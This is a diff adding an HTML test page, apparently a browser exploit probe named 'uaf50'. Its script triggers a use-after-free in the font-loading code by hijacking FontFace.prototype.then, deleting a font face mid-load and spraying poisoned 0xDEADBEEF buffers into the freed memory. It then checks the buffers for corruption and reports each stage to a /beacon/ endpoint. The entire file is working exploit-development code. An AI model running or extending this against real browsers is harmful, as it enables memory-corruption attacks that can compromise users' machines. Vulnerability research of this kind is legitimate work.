@@ -1,0 +1,55 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>uaf50</title>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+/* p565 stage 1 verbatim, except every buffer carries one poisoned qword at
+   OFF before check(): if the continuation reads that member, it faults. */
+var OFF = 0x30, K = 16, SIZE = 192, styleEl = null, firedHere = false, MAP = [];
+var U = Date.now().toString(36);
+function setupFace(){
+  var fam = 's'+U, nm = 'f'+U;
+  styleEl = document.createElement('style');
+  styleEl.textContent = "@font-face { font-family: "+fam+"; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(styleEl);
+  var A = new FontFace(nm, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(A);
+  void A.loaded;
+  window.__alive = [A];
+  return fam;
+}
+function run(){
+  b('U50-OFF-'+OFF+'-PARSE');
+  var fam = setupFace();
+  Object.defineProperty(FontFace.prototype, 'then', {
+    configurable: true,
+    get: function(){
+      if (firedHere) return undefined;
+      firedHere = true;
+      if (styleEl) styleEl.remove();
+      try { document.fonts.delete(this); } catch(e) {}
+      styleEl = null;
+      document.body.offsetHeight;
+      MAP = [];
+      for (var k=0;k<K;k++){
+        var u = new Uint8Array(new ArrayBuffer(SIZE));
+        u[OFF]=0xEF; u[OFF+1]=0xBE; u[OFF+2]=0xAD; u[OFF+3]=0xDE;
+        u[OFF+4]=0; u[OFF+5]=0; u[OFF+6]=0; u[OFF+7]=0;
+        MAP.push(u);
+      }
+      try { document.fonts.check('1em '+fam); } catch(e) {}
+      b('U50-OFF-'+OFF+'-CHECK-RETURNED');
+      return undefined;
+    },
+    set: function(){}
+  });
+  document.fonts.load('1em f'+U+', '+fam, 'AB').then(function(){ b('U50-OFF-'+OFF+'-RESOLVED'); },
+                                                     function(){ b('U50-OFF-'+OFF+'-REJECTED'); });
+  setTimeout(function(){
+    var hit=-1;
+    for (var i=0;i<MAP.length;i++){ var u=MAP[i]; if (u[0x58]||u[0x59]||u[0x5A]||u[0x5B]) { hit=i; break; } }
+    b('U50-OFF-'+OFF+'-HIT-'+hit);
+  }, 120);
+}
+if (document.readyState==='complete'||document.readyState==='interactive') setTimeout(run,0);
+else document.addEventListener('DOMContentLoaded',run);
+</script></head><body><p>uaf50</p></body></html>
